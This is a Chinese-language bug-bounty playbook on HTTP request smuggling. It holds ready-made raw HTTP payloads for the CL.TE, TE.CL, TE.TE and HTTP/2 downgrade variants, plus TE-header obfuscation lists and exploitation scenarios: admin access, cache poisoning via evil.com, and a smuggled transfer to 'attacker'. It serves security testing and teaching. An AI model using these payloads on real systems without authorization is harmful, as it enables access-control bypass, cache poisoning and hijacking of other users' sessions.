# HTTP 请求走私 (HTTP Request Smuggling)

> **定位**: 前后端 HTTP 解析不一致, 攻击者插入 "第二请求" 被后端误认为独立请求。
> **CWE**: CWE-444 | **OWASP**: A05:2021 Security Misconfiguration
> **回报**: Cloudflare/AWS/CDN 背后的业务, $2000-$20000+, PortSwigger Research 经典方向
> **适用**: 前端有反向代理/CDN (Nginx / Cloudflare / Akamai / ELB / Varnish / Apache)

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| 响应 Header 含 CDN / 反代特征 (`CF-Ray` / `X-Amz-Cf-Id` / `Via: ...nginx`) | 双层架构,走私可能 | §1 三种变种 |
| 同时发 `Content-Length` + `Transfer-Encoding` 响应正常 | 双头都被接受 | §1 三种变种 |
| 前端解析慢 / 后端响应快 | 解析时差 | §1.1 CL.TE |
| 前端响应快 / 后端等待 | 解析时差反向 | §1.2 TE.CL |
| 已知前端 Cloudflare/AWS ALB | 背后服务可能不同 | §1 + §2 利用 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

**禁止**: First-pass 不发会污染缓存/影响其它用户的 payload;先用 timing 探测。

---

## 0.1 Triage 速查

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| 双头都被接受但响应正常 | 两端同协议解析 | 不一定漏洞,试不同变种 |
| Burp 检测无果 | 严格代理 | 手工 timing 测试;换变种 |
| timing 差异巨大 | 走私可能成功 | §2 利用 (绕 WAF / 投毒) |
| 测试请求影响下个用户 | 走私已生效 | **立即停手**,只在受控目标继续 |

详细变种与利用见 §1 起。

---

## 0.2 核心原理

HTTP/1.1 定义两种标记请求 body 长度的方式:
- `Content-Length: N` (CL)
- `Transfer-Encoding: chunked` (TE)

若同时发这两个头, 前端按一种解析, 后端按另一种解析 → 请求拆分不一致 → 后端把残余字节认作下一个请求的开头。

攻击者可以用这个 "缝隙" 插入恶意请求, 通常效果:
1. 绕过前端 WAF/鉴权
2. 缓存投毒
3. 接管其他用户 session
4. 通过 admin URL 执行管理操作

---

## 1. 三种经典变种

### 1.1 CL.TE (前端用 CL, 后端用 TE)

前端按 CL 读 6 字节, 把整个请求转发;
后端按 TE 读 chunked, `0\r\n\r\n` 结束 → 剩下的 "G" 被认作下一个请求开头。

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### 1.2 TE.CL (前端用 TE, 后端用 CL)

前端按 TE 读到完整 chunked, 转发;
后端按 CL 只读 4 字节, 剩余被当成下一个请求。

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5e
GPOST /admin HTTP/1.1
Host: target.com
Content-Length: 15

x=1
0

```

### 1.3 TE.TE (混淆 TE 头)

两端都支持 TE, 但混淆让其中一端不识别 TE 头, 退回到 CL:

```http
Transfer-Encoding: chunked
Transfer-Encoding: x                    # 第二行混淆
# 或
Transfer-Encoding:chunked               # 不标准空格
Transfer-Encoding: xchunked             # 前缀
Transfer-Encoding: chunked\r            # 尾部字符
Transfer-Encoding\n : chunked           # obs-fold
Transfer-Encoding : chunked             # 头名后加空格
```

---

## 2. 8 种 TE 混淆变体

| 编号 | TE 头写法 | 解释 |
|------|----------|------|
| 1 | `Transfer-Encoding: xchunked` | 前缀加字符 |
| 2 | `Transfer-Encoding : chunked` | 头名后加空格 |
| 3 | `Transfer-Encoding: chunked\r` | 尾部 CR |
| 4 | `Transfer-Encoding:\tchunked` | Tab 分隔 |
| 5 | `Transfer-Encoding:[\x0b]chunked` | 垂直制表符 |
| 6 | `Transfer-Encoding: chunked, identity` | 多值 |
| 7 | 两个 TE 头, 一个 `chunked` 一个 `x` | 重复 |
| 8 | `X: X\nTransfer-Encoding: chunked` | obs-fold |

**测试策略**: 把 8 种轮换, 看哪个让前后端不一致。

---

## 3. HTTP/2 降级走私 (H2.CL / H2.TE)

### 3.1 H2.CL

前端接收 HTTP/2 请求, 转发给后端 HTTP/1.1 时自动加 `Content-Length`。若请求在 HTTP/2 层面携带了攻击者指定的 CL, 前端可能信任之:

```
POST / HTTP/2
Host: target.com
content-length: 0

GET /admin HTTP/1.1
Host: target.com
```

### 3.2 H2.TE

```
POST / HTTP/2
Host: target.com
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```

### 3.3 客户端 desync

HTTP/1.1 Keep-Alive 下, 浏览器发多个请求共享连接。若攻击者的第一个请求能 "毒化" 连接, 第二个合法请求会被应用错认。

---

## 4. 检测流程

### 4.1 初步探测 (非破坏)

用 `smuggler.py` (defparam/smuggler) 最快:
```bash
python3 smuggler.py -u https://target.com
```

### 4.2 时间盲检测

发 CL.TE 探针, 若后端挂起(等待后续 body), 响应会延迟:
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

- 前端按 CL=4, 转发;
- 后端按 TE, 读到 `1\r\nA\r\n`, 然后读 `X` 作为下一 chunk, 但 `X` 不是合法 chunk size → **后端等超时**。

### 4.3 差异响应检测

CL.TE 精确构造, 第二请求头拼接成访问 `/admin` 的 GET:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: x
```

若下一个合法用户的响应意外是 `/admin` 页面, **走私成功**。

---

## 5. 利用场景

### 5.1 绕过前端 WAF

前端 WAF 看 CL 长度, 只检查前端认为的 body 部分; 后端解析到更长的部分, 攻击 payload 藏在后端 "看得见" 前端 "看不见" 的位置。

### 5.2 缓存投毒

让后端把 **其他用户的响应** 当成你的响应缓存:
```http
POST / HTTP/1.1
Host: target.com
...

GET /home HTTP/1.1
Host: evil.com            # 污染 Host, 响应被后续 /home 请求接收
```

### 5.3 接管 Session

让 **下一个合法用户** 的 GET 请求前缀上你预先的 POST:
```
# 受害者发 GET /user/profile
# 但你走私了 POST /api/transfer with body "to=attacker"
# 后端认为: 先收到 POST /api/transfer, 然后是前缀 GGET /user/profile → 解析错误但 POST 已执行
```

### 5.4 通过 XSS 反射

走私一个包含 X-Forwarded-Host: evil.com 的请求, 影响下个用户的响应 → 反射到 HTML 触发 XSS。

---

## 6. 工具

| 工具 | 用途 |
|------|------|
| `smuggler.py` (defparam) | 自动化探测 CL.TE / TE.CL / TE.TE |
| `http-request-smuggler` (Burp 插件, PortSwigger) | Burp 内集成, 最全 |
| `h2csmuggler.py` | H2C (HTTP/2 over cleartext) 走私 |
| `Turbo Intruder` (Burp) | 大量并发, 竞态配合 |
| `Nuclei -t smuggling` | 快速初筛 |

---

## 7. Payload 模板库

### 7.1 最小 CL.TE 探针
```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 6

0

G
```

### 7.2 CL.TE 走私到 /admin
```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Content-Length: 54

0

GET /admin HTTP/1.1
Host: TARGET
Cookie: x=1


```
(注意行尾必须 `\r\n`, 手写时用 Burp Repeater 勾选 Update Content-Length 关掉。)

### 7.3 TE.CL 走私
```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /admin HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

---

## 8. 识别你的目标是否可能走私

| 信号 | 观察 |
|------|------|
| 响应头含 `Via:` / `X-Cache:` / `X-Served-By:` | 有反向代理/CDN |
| `Server: cloudflare/akamai/nginx/varnish` | 明确前端厂商 |
| 存在 `Connection: keep-alive` | 连接复用, 利于走私 |
| 响应的 `Server` 与 `X-Backend-Server` 不同 | 两层解析(高度可疑) |
| 同一 URL 时而返回不同响应 | 已有缓存/连接复用迹象 |

---

## 9. Testing Checklist

- [ ] smuggler.py 跑一遍探测所有变体
- [ ] Burp 插件 http-request-smuggler 启用
- [ ] 测试 HTTP/2 降级 (h2csmuggler)
- [ ] 观察响应时间异常(后端挂起 = 解析分歧)
- [ ] 同一连接 keep-alive 发多个请求, 观察响应顺序是否错乱
- [ ] 尝试走私访问 `/admin` / `/internal` / `/api/v0/`
- [ ] 结合条件竞争, 用 Turbo Intruder 并发
- [ ] 检查 CDN 厂商已知 CVE (Cloudflare / AWS CloudFront / Akamai)

---

## 10. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| 响应延迟 30s | 可能就是后端慢, 不一定是走私成功 |
| 响应不同 | 可能是 A/B test 或 cache miss 随机 |
| 看到 `/admin` 页面 | 检查是不是自己 browser cache/autologin |
| 所有测试都 400 | 可能有 WAF 在前, 走私无法穿透 |

**正确验证**: 必须能**复现**走私, 用两个请求 A + B, B 应当收到 A 走私出的内容, 重复 3 次都成功。

---

## 11. 影响证明

**低等级**: 成功走私一个 GET 到后端, 拿到后端实际响应。

**高等级**(冲赏金):
1. 走私到 `/admin` 内部接口, 截图管理员功能
2. 缓存投毒: 让其他用户看到攻击者控制的内容
3. 客户端 desync: 劫持下一个用户的 cookie/token
4. 结合 reflected XSS → 批量入侵用户

---

## 12. 相关参考

| 内容 | 文件 |
|------|------|
| HTTP/2 专项 | 本文件 §3 |
| WAF 绕过(相似方向) | [../waf-bypass.md](../waf-bypass.md) |
| 缓存投毒(相关) | [cors-cache.md](cors-cache.md) §Cache |
| 401/403 绕过(相关) | [path-traversal.md](path-traversal.md) §401-403 |

---

**CWE**: CWE-444 | **CVSS 典型**: 9.0 (走私 + 接管 session) / 7.5 (缓存投毒)
